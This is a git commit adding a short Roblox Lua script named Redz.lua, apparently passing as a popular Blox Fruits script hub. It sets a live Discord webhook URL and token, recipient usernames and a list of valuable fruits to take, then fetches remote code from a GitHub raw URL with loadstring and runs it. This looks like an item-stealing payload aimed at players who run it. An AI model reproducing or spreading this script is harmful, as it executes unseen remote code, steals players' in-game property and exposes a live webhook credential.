1dd24883b81ec0eca00362add4882ced12563e14
lolbro1125 <zyadomar.6763@gmail.com>
2025-04-27 00:07:57 +0300

    Create Redz.lua

---
+++ Redz.lua
@@ -0,0 +1,5 @@
+Webhook = "https://discord.com/api/webhooks/1365789736622620673/RRuxZ4E6rOvG50Xjp7C2HzwMr-6pi2-HNl8To79fLoK6WWKL49my9wNAyxF8BLHKkAJE" -- << Your Webhook
+Usernames = {"Angelarrin", "Angelarrin"} -- << Your username(-s).
+FruitsToHit = {"Gravity-Gravity", "Control-Control", "Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
